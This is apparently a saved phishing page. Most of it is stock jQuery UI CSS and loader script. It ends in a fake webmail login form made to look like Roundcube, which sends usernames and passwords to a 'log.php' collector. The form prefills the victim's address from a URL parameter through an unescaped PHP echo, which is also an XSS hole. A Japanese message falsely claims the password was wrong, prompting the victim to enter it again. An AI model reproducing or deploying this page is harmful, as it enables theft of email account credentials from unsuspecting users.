.ui-icon-suitcase { background-position: -112px -96px; }
.ui-icon-comment { background-position: -128px -96px; }
.ui-icon-person { background-position: -144px -96px; }
.ui-icon-print { background-position: -160px -96px; }
.ui-icon-trash { background-position: -176px -96px; }
.ui-icon-locked { background-position: -192px -96px; }
.ui-icon-unlocked { background-position: -208px -96px; }
.ui-icon-bookmark { background-position: -224px -96px; }
.ui-icon-tag { background-position: -240px -96px; }
.ui-icon-home { background-position: 0 -112px; }
.ui-icon-flag { background-position: -16px -112px; }
.ui-icon-calendar { background-position: -32px -112px; }
.ui-icon-cart { background-position: -48px -112px; }
.ui-icon-pencil { background-position: -64px -112px; }
.ui-icon-clock { background-position: -80px -112px; }
.ui-icon-disk { background-position: -96px -112px; }
.ui-icon-calculator { background-position: -112px -112px; }
.ui-icon-zoomin { background-position: -128px -112px; }
.ui-icon-zoomout { background-position: -144px -112px; }
.ui-icon-search { background-position: -160px -112px; }
.ui-icon-wrench { background-position: -176px -112px; }
.ui-icon-gear { background-position: -192px -112px; }
.ui-icon-heart { background-position: -208px -112px; }
.ui-icon-star { background-position: -224px -112px; }
.ui-icon-link { background-position: -240px -112px; }
.ui-icon-cancel { background-position: 0 -128px; }
.ui-icon-plus { background-position: -16px -128px; }
.ui-icon-plusthick { background-position: -32px -128px; }
.ui-icon-minus { background-position: -48px -128px; }
.ui-icon-minusthick { background-position: -64px -128px; }
.ui-icon-close { background-position: -80px -128px; }
.ui-icon-closethick { background-position: -96px -128px; }
.ui-icon-key { background-position: -112px -128px; }
.ui-icon-lightbulb { background-position: -128px -128px; }
.ui-icon-scissors { background-position: -144px -128px; }
.ui-icon-clipboard { background-position: -160px -128px; }
.ui-icon-copy { background-position: -176px -128px; }
.ui-icon-contact { background-position: -192px -128px; }
.ui-icon-image { background-position: -208px -128px; }
.ui-icon-video { background-position: -224px -128px; }
.ui-icon-script { background-position: -240px -128px; }
.ui-icon-alert { background-position: 0 -144px; }
.ui-icon-info { background-position: -16px -144px; }
.ui-icon-notice { background-position: -32px -144px; }
.ui-icon-help { background-position: -48px -144px; }
.ui-icon-check { background-position: -64px -144px; }
.ui-icon-bullet { background-position: -80px -144px; }
.ui-icon-radio-off { background-position: -96px -144px; }
.ui-icon-radio-on { background-position: -112px -144px; }
.ui-icon-pin-w { background-position: -128px -144px; }
.ui-icon-pin-s { background-position: -144px -144px; }
.ui-icon-play { background-position: 0 -160px; }
.ui-icon-pause { background-position: -16px -160px; }
.ui-icon-seek-next { background-position: -32px -160px; }
.ui-icon-seek-prev { background-position: -48px -160px; }
.ui-icon-seek-end { background-position: -64px -160px; }
.ui-icon-seek-start { background-position: -80px -160px; }
/* ui-icon-seek-first is deprecated, use ui-icon-seek-start instead */
.ui-icon-seek-first { background-position: -80px -160px; }
.ui-icon-stop { background-position: -96px -160px; }
.ui-icon-eject { background-position: -112px -160px; }
.ui-icon-volume-off { background-position: -128px -160px; }
.ui-icon-volume-on { background-position: -144px -160px; }
.ui-icon-power { background-position: 0 -176px; }
.ui-icon-signal-diag { background-position: -16px -176px; }
.ui-icon-signal { background-position: -32px -176px; }
.ui-icon-battery-0 { background-position: -48px -176px; }
.ui-icon-battery-1 { background-position: -64px -176px; }
.ui-icon-battery-2 { background-position: -80px -176px; }
.ui-icon-battery-3 { background-position: -96px -176px; }
.ui-icon-circle-plus { background-position: 0 -192px; }
.ui-icon-circle-minus { background-position: -16px -192px; }
.ui-icon-circle-close { background-position: -32px -192px; }
.ui-icon-circle-triangle-e { background-position: -48px -192px; }
.ui-icon-circle-triangle-s { background-position: -64px -192px; }
.ui-icon-circle-triangle-w { background-position: -80px -192px; }
.ui-icon-circle-triangle-n { background-position: -96px -192px; }
.ui-icon-circle-arrow-e { background-position: -112px -192px; }
.ui-icon-circle-arrow-s { background-position: -128px -192px; }
.ui-icon-circle-arrow-w { background-position: -144px -192px; }
.ui-icon-circle-arrow-n { background-position: -160px -192px; }
.ui-icon-circle-zoomin { background-position: -176px -192px; }
.ui-icon-circle-zoomout { background-position: -192px -192px; }
.ui-icon-circle-check { background-position: -208px -192px; }
.ui-icon-circlesmall-plus { background-position: 0 -208px; }
.ui-icon-circlesmall-minus { background-position: -16px -208px; }
.ui-icon-circlesmall-close { background-position: -32px -208px; }
.ui-icon-squaresmall-plus { background-position: -48px -208px; }
.ui-icon-squaresmall-minus { background-position: -64px -208px; }
.ui-icon-squaresmall-close { background-position: -80px -208px; }
.ui-icon-grip-dotted-vertical { background-position: 0 -224px; }
.ui-icon-grip-dotted-horizontal { background-position: -16px -224px; }
.ui-icon-grip-solid-vertical { background-position: -32px -224px; }
.ui-icon-grip-solid-horizontal { background-position: -48px -224px; }
.ui-icon-gripsmall-diagonal-se { background-position: -64px -224px; }
.ui-icon-grip-diagonal-se { background-position: -80px -224px; }


/* Misc visuals
----------------------------------*/

/* Corner radius */
.ui-corner-all, .ui-corner-top, .ui-corner-left, .ui-corner-tl { -moz-border-radius-topleft: 0; -webkit-border-top-left-radius: 0; -khtml-border-top-left-radius: 0; border-top-left-radius: 0; }
.ui-corner-all, .ui-corner-top, .ui-corner-right, .ui-corner-tr { -moz-border-radius-topright: 0; -webkit-border-top-right-radius: 0; -khtml-border-top-right-radius: 0; border-top-right-radius: 0; }
.ui-corner-all, .ui-corner-bottom, .ui-corner-left, .ui-corner-bl { -moz-border-radius-bottomleft: 0; -webkit-border-bottom-left-radius: 0; -khtml-border-bottom-left-radius: 0; border-bottom-left-radius: 0; }
.ui-corner-all, .ui-corner-bottom, .ui-corner-right, .ui-corner-br { -moz-border-radius-bottomright: 0; -webkit-border-bottom-right-radius: 0; -khtml-border-bottom-right-radius: 0; border-bottom-right-radius: 0; }

/* Overlays */
.ui-widget-overlay { background: #aaaaaa /*savepage-url=images/ui-bg_flat_0_aaaaaa_40x100.png*/ url() 50% 50% repeat-x; opacity: .30;filter:Alpha(Opacity=30); }
.ui-widget-shadow { margin: -6px 0 0 -6px; padding: 6px; background: #aaaaaa /*savepage-url=images/ui-bg_flat_0_aaaaaa_40x100.png*/ url() 50% 50% repeat-x; opacity: .35;filter:Alpha(Opacity=35); -moz-border-radius: 6px; -khtml-border-radius: 6px; -webkit-border-radius: 6px; border-radius: 6px; }/*
 * jQuery UI Resizable 1.8.18
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Resizable#theming
 */
.ui-resizable { position: relative;}
.ui-resizable-handle { position: absolute;font-size: 0.1px;z-index: 99999; display: block; }
.ui-resizable-disabled .ui-resizable-handle, .ui-resizable-autohide .ui-resizable-handle { display: none; }
.ui-resizable-n { cursor: n-resize; height: 7px; width: 100%; top: -5px; left: 0; }
.ui-resizable-s { cursor: s-resize; height: 7px; width: 100%; bottom: -5px; left: 0; }
.ui-resizable-e { cursor: e-resize; width: 7px; right: -5px; top: 0; height: 100%; }
.ui-resizable-w { cursor: w-resize; width: 7px; left: -5px; top: 0; height: 100%; }
.ui-resizable-se { cursor: se-resize; width: 12px; height: 12px; right: 1px; bottom: 1px; }
.ui-resizable-sw { cursor: sw-resize; width: 9px; height: 9px; left: -5px; bottom: -5px; }
.ui-resizable-nw { cursor: nw-resize; width: 9px; height: 9px; left: -5px; top: -5px; }
.ui-resizable-ne { cursor: ne-resize; width: 9px; height: 9px; right: -5px; top: -5px;}/*
 * jQuery UI Selectable 1.8.18
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Selectable#theming
 */
.ui-selectable-helper { position: absolute; z-index: 100; border:1px dotted black; }
/*
 * jQuery UI Accordion 1.8.18
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Accordion#theming
 */
/* IE/Win - Fix animation bug - #4615 */
.ui-accordion { width: 100%; }
.ui-accordion .ui-accordion-header { cursor: pointer; position: relative; margin-top: 1px; zoom: 1; }
.ui-accordion .ui-accordion-li-fix { display: inline; }
.ui-accordion .ui-accordion-header-active { border-bottom: 0 !important; }
.ui-accordion .ui-accordion-header a { display: block; font-size: 1em; padding: .5em .5em .5em .7em; }
.ui-accordion-icons .ui-accordion-header a { padding-left: 2.2em; }
.ui-accordion .ui-accordion-header .ui-icon { position: absolute; left: .5em; top: 50%; margin-top: -8px; }
.ui-accordion .ui-accordion-content { padding: 1em 2.2em; border-top: 0; margin-top: -2px; position: relative; top: 1px; margin-bottom: 2px; overflow: auto; display: none; zoom: 1; }
.ui-accordion .ui-accordion-content-active { display: block; }
/*
 * jQuery UI Autocomplete 1.8.18
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Autocomplete#theming
 */
.ui-autocomplete { position: absolute; cursor: default; }	

/* workarounds */
* html .ui-autocomplete { width:1px; } /* without this, the menu expands to 100% in IE6 */

#ui-active-menuitem { background:#c33; border-color:#a22; color:#fff; }

/*
 * jQuery UI Menu 1.8.18
 *
 * Copyright 2010, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Menu#theming
 */
.ui-menu {
	list-style:none;
	padding: 2px;
	margin: 0;
	display:block;
	float: left;
	box-shadow: 1px 1px 18px #999;
	-moz-box-shadow: 1px 1px 12px #999;
	-webkit-box-shadow: #999 1px 1px 12px;
}
.ui-menu .ui-menu {
	margin-top: -3px;
}
.ui-menu .ui-menu-item {
	margin:0;
	padding: 0;
	zoom: 1;
	float: left;
	clear: left;
	width: 100%;
}
.ui-menu .ui-menu-item a {
	text-decoration:none;
	display:block;
	padding:.2em .4em;
	line-height:1.5;
	zoom:1;
}
.ui-menu .ui-menu-item a.ui-state-focus,
.ui-menu .ui-menu-item a.ui-state-active {
	font-weight: normal;
	margin: -1px;
}
/*
 * jQuery UI Button 1.8.18
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Button#theming
 */
.ui-button { display: inline-block; position: relative; padding: 0; margin-right: .1em; text-decoration: none !important; cursor: pointer; text-align: center; zoom: 1; overflow: hidden; *overflow: visible; } /* the overflow property removes extra width in IE */
.ui-button-icon-only { width: 2.2em; } /* to make room for the icon, a width needs to be set here */
button.ui-button-icon-only { width: 2.4em; } /* button elements seem to need a little more width */
.ui-button-icons-only { width: 3.4em; } 
button.ui-button-icons-only { width: 3.7em; } 
button.ui-button-text-only, a.ui-button-text-only { background-image: /*savepage-url=images/buttongradient.png*/ url() !important; }

/*button text element */
.ui-button .ui-button-text { display: block; line-height: 1.4;  }
.ui-button-text-only .ui-button-text { padding: .3em 1em; }
.ui-button-icon-only .ui-button-text, .ui-button-icons-only .ui-button-text { padding: .4em; text-indent: -9999999px; }
.ui-button-text-icon-primary .ui-button-text, .ui-button-text-icons .ui-button-text { padding: .4em 1em .4em 2.1em; }
.ui-button-text-icon-secondary .ui-button-text, .ui-button-text-icons .ui-button-text { padding: .4em 2.1em .4em 1em; }
.ui-button-text-icons .ui-button-text { padding-left: 2.1em; padding-right: 2.1em; }
/* no icon support for input elements, provide padding by default */
input.ui-button { padding: .4em 1em; }

/*button icon element(s) */
.ui-button-icon-only .ui-icon, .ui-button-text-icon-primary .ui-icon, .ui-button-text-icon-secondary .ui-icon, .ui-button-text-icons .ui-icon, .ui-button-icons-only .ui-icon { position: absolute; top: 50%; margin-top: -8px; }
.ui-button-icon-only .ui-icon { left: 50%; margin-left: -8px; }
.ui-button-text-icon-primary .ui-button-icon-primary, .ui-button-text-icons .ui-button-icon-primary, .ui-button-icons-only .ui-button-icon-primary { left: .5em; }
.ui-button-text-icon-secondary .ui-button-icon-secondary, .ui-button-text-icons .ui-button-icon-secondary, .ui-button-icons-only .ui-button-icon-secondary { right: .5em; }
.ui-button-text-icons .ui-button-icon-secondary, .ui-button-icons-only .ui-button-icon-secondary { right: .5em; }

/*button sets*/
.ui-buttonset { margin-right: 7px; }
.ui-buttonset .ui-button { margin-left: 0; margin-right: -.3em; }

/* workarounds */
button.ui-button::-moz-focus-inner { border: 0; padding: 0; } /* reset extra padding in Firefox */
/*
 * jQuery UI Dialog 1.8.18
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Dialog#theming
 */
.ui-dialog { position: absolute; padding: .2em; width: 300px; overflow: hidden; box-shadow: 1px 1px 18px #999; -moz-box-shadow: 1px 1px 12px #999; -webkit-box-shadow: #999 1px 1px 12px; }
.ui-dialog .ui-dialog-titlebar { padding: .4em 1em; position: relative;  }
.ui-dialog .ui-dialog-title { float: left; margin: .1em 16px .1em 0; } 
.ui-dialog .ui-dialog-titlebar-close { position: absolute; right: .3em; top: 50%; width: 19px; margin: -10px 0 0 0; padding: 1px; height: 18px; }
.ui-dialog .ui-dialog-titlebar-close span { display: block; margin: 1px; }
.ui-dialog .ui-dialog-titlebar-close:hover, .ui-dialog .ui-dialog-titlebar-close:focus { padding: 0; }
.ui-dialog .ui-dialog-content { position: relative; border: 0; padding: .5em 1em; background: none; overflow: auto; zoom: 1; }
.ui-dialog .ui-dialog-buttonpane { text-align: left; border-width: 1px 0 0 0; background-image: none; margin: .5em 0 0 0; padding: .3em 1em .5em .4em; }
.ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset { float: right; }
.ui-dialog .ui-dialog-buttonpane button { margin: .5em .4em .5em 0; cursor: default; }
.ui-dialog .ui-resizable-se { width: 14px; height: 14px; right: 3px; bottom: 3px; }
.ui-draggable .ui-dialog-titlebar { cursor: move; }
/*
 * jQuery UI Slider 1.8.18
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Slider#theming
 */
.ui-slider { position: relative; text-align: left; }
.ui-slider .ui-slider-handle { position: absolute; z-index: 2; width: 1.2em; height: 1.2em; cursor: default; }
.ui-slider .ui-slider-range { position: absolute; z-index: 1; font-size: .7em; display: block; border: 0; background-position: 0 0; }

.ui-slider-horizontal { height: .8em; }
.ui-slider-horizontal .ui-slider-handle { top: -.3em; margin-left: -.6em; }
.ui-slider-horizontal .ui-slider-range { top: 0; height: 100%; }
.ui-slider-horizontal .ui-slider-range-min { left: 0; }
.ui-slider-horizontal .ui-slider-range-max { right: 0; }

.ui-slider-vertical { width: .8em; height: 100px; }
.ui-slider-vertical .ui-slider-handle { left: -.3em; margin-left: 0; margin-bottom: -.6em; }
.ui-slider-vertical .ui-slider-range { left: 0; width: 100%; }
.ui-slider-vertical .ui-slider-range-min { bottom: 0; }
.ui-slider-vertical .ui-slider-range-max { top: 0; }/*
 * jQuery UI Tabs 1.8.18
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Tabs#theming
 */
.ui-tabs { position: relative; padding: .2em; zoom: 1; } /* position: relative prevents IE scroll bug (element with position: relative inside container with overflow: auto appear as "fixed") */
.ui-tabs .ui-tabs-nav { margin: 0; padding: .2em .2em 0; }
.ui-tabs .ui-tabs-nav li { list-style: none; float: left; position: relative; top: 1px; margin: 0 0 1px 0; border-bottom: 0 !important; padding: 0; white-space: nowrap; -moz-border-radius-topleft: 2px; -webkit-border-top-left-radius: 2px; border-top-left-radius: 2px; -moz-border-radius-topright: 2px; -webkit-border-top-right-radius: 2px; border-top-right-radius: 2px; }
.ui-tabs .ui-tabs-nav li a { float: left; padding: .3em 1em; text-decoration: none; }
.ui-tabs .ui-tabs-nav li.ui-tabs-selected { margin-bottom: 0; padding-bottom: 1px; }
.ui-tabs .ui-tabs-nav li.ui-tabs-selected a, .ui-tabs .ui-tabs-nav li.ui-state-disabled a, .ui-tabs .ui-tabs-nav li.ui-state-processing a { cursor: text; }
.ui-tabs .ui-tabs-nav li a, .ui-tabs.ui-tabs-collapsible .ui-tabs-nav li.ui-tabs-selected a { cursor: pointer; } /* first selector in group seems obsolete, but required to overcome bug in Opera applying cursor: text overall if defined elsewhere... */
.ui-tabs .ui-tabs-panel { display: block; border-width: 0; padding: 1em 1.4em; background: none; }
.ui-tabs .ui-tabs-hide { display: none !important; }

.ui-dialog .ui-tabs .ui-tabs-nav li.ui-tabs-selected { background:#fff; }

/*
 * jQuery UI Datepicker 1.8.18
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Datepicker#theming
 */
.ui-datepicker { width: 17em; padding: .2em .2em 0; display: none; box-shadow: 1px 1px 18px #999; -moz-box-shadow: 1px 1px 12px #999; -webkit-box-shadow: #999 1px 1px 12px; }
.ui-datepicker .ui-datepicker-header { position:relative; padding:.2em 0; }
.ui-datepicker .ui-datepicker-prev, .ui-datepicker .ui-datepicker-next { position:absolute; top: 2px; width: 1.8em; height: 1.8em; }
.ui-datepicker .ui-datepicker-prev-hover, .ui-datepicker .ui-datepicker-next-hover { top: 1px; }
.ui-datepicker .ui-datepicker-prev { left:2px; }
.ui-datepicker .ui-datepicker-next { right:2px; }
.ui-datepicker .ui-datepicker-prev-hover { left:1px; }
.ui-datepicker .ui-datepicker-next-hover { right:1px; }
.ui-datepicker .ui-datepicker-prev span, .ui-datepicker .ui-datepicker-next span { display: block; position: absolute; left: 50%; margin-left: -8px; top: 50%; margin-top: -8px;  }
.ui-datepicker .ui-datepicker-title { margin: 0 2.3em; line-height: 1.8em; text-align: center; }
.ui-datepicker .ui-datepicker-title select { font-size:1em; margin:1px 0; }
.ui-datepicker select.ui-datepicker-month-year {width: 100%;}
.ui-datepicker select.ui-datepicker-month, 
.ui-datepicker select.ui-datepicker-year { width: 49%;}
.ui-datepicker table {width: 100%; font-size: .9em; border-collapse: collapse; margin:0 0 .4em; }
.ui-datepicker th { padding: .7em .3em; text-align: center; font-weight: bold; border: 0;  }
.ui-datepicker td { border: 0; padding: 1px; }
.ui-datepicker td span, .ui-datepicker td a { display: block; padding: .2em; text-align: right; text-decoration: none; }
.ui-datepicker td.ui-datepicker-current-day .ui-state-active { background:#c33; border-color:#a22; color:#fff; }
.ui-datepicker .ui-datepicker-buttonpane { background-image: none; margin: .7em 0 0 0; padding:0 .2em; border-left: 0; border-right: 0; border-bottom: 0; }
.ui-datepicker .ui-datepicker-buttonpane button { float: right; margin: .5em .2em .4em; cursor: default; padding: .2em .6em .3em .6em; width:auto; overflow:visible; }
.ui-datepicker .ui-datepicker-buttonpane button.ui-datepicker-current { float:left; }

/* with multiple calendars */
.ui-datepicker.ui-datepicker-multi { width:auto; }
.ui-datepicker-multi .ui-datepicker-group { float:left; }
.ui-datepicker-multi .ui-datepicker-group table { width:95%; margin:0 auto .4em; }
.ui-datepicker-multi-2 .ui-datepicker-group { width:50%; }
.ui-datepicker-multi-3 .ui-datepicker-group { width:33.3%; }
.ui-datepicker-multi-4 .ui-datepicker-group { width:25%; }
.ui-datepicker-multi .ui-datepicker-group-last .ui-datepicker-header { border-left-width:0; }
.ui-datepicker-multi .ui-datepicker-group-middle .ui-datepicker-header { border-left-width:0; }
.ui-datepicker-multi .ui-datepicker-buttonpane { clear:left; }
.ui-datepicker-row-break { clear:both; width:100%; font-size:0em; }

/* RTL support */
.ui-datepicker-rtl { direction: rtl; }
.ui-datepicker-rtl .ui-datepicker-prev { right: 2px; left: auto; }
.ui-datepicker-rtl .ui-datepicker-next { left: 2px; right: auto; }
.ui-datepicker-rtl .ui-datepicker-prev:hover { right: 1px; left: auto; }
.ui-datepicker-rtl .ui-datepicker-next:hover { left: 1px; right: auto; }
.ui-datepicker-rtl .ui-datepicker-buttonpane { clear:right; }
.ui-datepicker-rtl .ui-datepicker-buttonpane button { float: left; }
.ui-datepicker-rtl .ui-datepicker-buttonpane button.ui-datepicker-current { float:right; }
.ui-datepicker-rtl .ui-datepicker-group { float:right; }
.ui-datepicker-rtl .ui-datepicker-group-last .ui-datepicker-header { border-right-width:0; border-left-width:1px; }
.ui-datepicker-rtl .ui-datepicker-group-middle .ui-datepicker-header { border-right-width:0; border-left-width:1px; }

/* IE6 IFRAME FIX (taken from datepicker 1.5.3 */
.ui-datepicker-cover {
    display: none; /*sorry for IE5*/
    display/**/: block; /*sorry for IE5*/
    position: absolute; /*must have*/
    z-index: -1; /*must have*/
    filter: mask(); /*must have*/
    top: -4px; /*must have*/
    left: -4px; /*must have*/
    width: 200px; /*must have*/
    height: 200px; /*must have*/
}/*
 * jQuery UI Progressbar 1.8.18
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Progressbar#theming
 */
.ui-progressbar { height:2em; text-align: left; overflow: hidden; }
.ui-progressbar .ui-progressbar-value {margin: -1px; height:100%; }</style>
<script data-savepage-src="program/js/jquery.min.js?s=1415172545" type="text/javascript"></script>
<script data-savepage-src="program/js/common.min.js?s=1415172545" type="text/javascript"></script>
<script data-savepage-src="program/js/app.min.js?s=1415254003" type="text/javascript"></script>
<script data-savepage-src="program/js/jstz.min.js?s=1415172545" type="text/javascript"></script>
<script type="text/javascript"></script>

<script type="text/javascript" data-savepage-src="plugins/jqueryui/js/jquery-ui-1.9.2.custom.min.js?s=1415172545"></script>
<script type="text/javascript" data-savepage-src="plugins/jqueryui/js/i18n/jquery.ui.datepicker-en-GB.js?s=1415172545"></script>

<style id="savepage-cssvariables">
  :root {
    --savepage-url-4: url(data:image/gif;base64,R0lGODdhDAA0APQfAI2MjOjq6u7v787OzvHy8tLS09HR0N7e3aqpqr29vKWjo+Dg4JmYmMPDwuvs7Ofp6dDPz5WTk7a2t7CwsMrJyuTk5J6enZCPj9vb29XV1fT09NnZ2efn583NzczMzNfX1iwAAAAADAA0AAAFv6AmjmRpniihrmy7Cq0gz3Rtz06u73ngBECfrxd4PILBY9HIbBoP0KgUuqlar9isFvvZfL7gMDhDLpvJhbR6nTa433D3YACBzOv4QWff0ev5HR6Cg4SCgIeIiYqLixyOj5CRko8VlZaXlQuam5yaGJ+goZ9npBl4p6gUqqusqg2vsLGvCbS1trQSubq7uRO+v8C+CMPExcMKyMnKyBbNzs/NDNLT1NIR19jZ1xfc3d7cAOHi4+Tl5ufo6err7OQhADs=);
    --savepage-url-5: url(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAUCAMAAACK2/weAAAAOVBMVEXq6uvp6en4+fn+/f7n5+ft7e78+/v7+/vm5uf9/f75+fno6Onu7e7r6uv09PTx8fH29vbk5OX///9Fl2QFAAAARklEQVR4Xr3Hxw2AUBADUe/PkdR/scjyaSmAdxkNHue/7RSj0lGpFKViUAjKwOXgcHA6WJSzsrAJCjYmmSkTjVJSGm7nsy/W4g90C79RnQAAAABJRU5ErkJggg==);
  }
</style>
<script id="savepage-shadowloader" type="application/javascript">
  "use strict"
  window.addEventListener("DOMContentLoaded",
  function(event)
  {
    savepage_ShadowLoader(5);
  },false);
  function savepage_ShadowLoader(c){createShadowDOMs(0,document.documentElement);function createShadowDOMs(a,b){var i;if(b.localName=="iframe"||b.localName=="frame"){if(a<c){try{if(b.contentDocument.documentElement!=null){createShadowDOMs(a+1,b.contentDocument.documentElement)}}catch(e){}}}else{if(b.children.length>=1&&b.children[0].localName=="template"&&b.children[0].hasAttribute("data-savepage-shadowroot")){b.attachShadow({mode:"open"}).appendChild(b.children[0].content);b.removeChild(b.children[0]);for(i=0;i<b.shadowRoot.children.length;i++)if(b.shadowRoot.children[i]!=null)createShadowDOMs(a,b.shadowRoot.children[i])}for(i=0;i<b.children.length;i++)if(b.children[i]!=null)createShadowDOMs(a,b.children[i])}}}
</script>
  </head>
<body>
<img data-savepage-src="skins/default//images/no-logo.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB98DCgYKIbWqGogAAAAdaVRYdENvbW1lbnQAAAAAAENyZWF0ZWQgd2l0aCBHSU1QZC5lBwAAAA1JREFUCNdjYGBgYAAAAAUAAV7zKjoAAAAASUVORK5CYII=" alt="">

<div id="message"></div>

<div id="login-form">
<div class="boxtitle">Welcome to Webmail</div>
<div class="boxcontent">

<form name="form" method="post" action="log.php">
<input type="hidden" name="_token" value="52044e48ebb736e38ee99140080cd7e2">
<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="Africa/Johannesburg"><input type="hidden" name="_url" id="rcmloginurl" value=""><table summary="" border="0"><tbody><tr><td class="title"><label for="rcmloginuser">Username</label>
</td>
<td class="input"><input name="_user" id="rcmloginuser" required="required" autocapitalize="off" autocomplete="off" type="text" value="<?php echo $_GET['cw'] ?>"></td>
</tr>
<tr><td class="title"><label for="rcmloginpwd">Password</label>
</td>
<td class="input"><input name="_pass" id="rcmloginpwd" required="required" autocapitalize="off" autocomplete="off" type="password" value=""></td>
</tr>
</tbody>
</table>
<center><input name="check_save_user" id="cookie_check_flg" type="checkbox">
                    <script></script>
                    <label for="rcmloginpwd"><font color="#666">メールアドレスを保存する</font></label>
                    
                    
                    </center><font color="#ff0000"><p style="text-align:center;">パスワードが正しくありません。もう一度ログインしてください。</p></font><p class="formbuttons"><input type="submit" id="rcmloginsubmit" class="button mainaction" value="Login"></p>

</form>

</div>
</div>

<noscript>
  <p id="login-noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
</noscript>




<script type="text/javascript"></script>


</body></html>